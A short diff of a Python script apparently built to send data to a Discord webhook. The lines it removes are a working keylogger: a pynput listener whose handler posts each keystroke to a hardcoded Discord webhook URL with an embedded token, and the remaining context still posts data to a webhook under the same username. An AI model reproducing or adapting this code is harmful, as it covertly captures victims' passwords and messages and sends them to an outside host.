@@ -1,5 +1,4 @@
 import requests
-from pynput import keyboard
 import os
 from re import findall
 
@@ -30,28 +29,3 @@ data = {
         "username": "feb"
 }
 result = requests.post(url, json=data)
-
-
-def on_press(key):
-    try:
-        url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
-        data = {
-            "content": key.char,
-            "username": "feb"
-        }
-        result = requests.post(url, json=data)
-    except:
-        return
-    try:
-        url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
-        data = {
-            "content": key,
-            "username": "feb"
-        }
-        result = requests.post(url, json=data)
-    except:
-        return
-
-
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
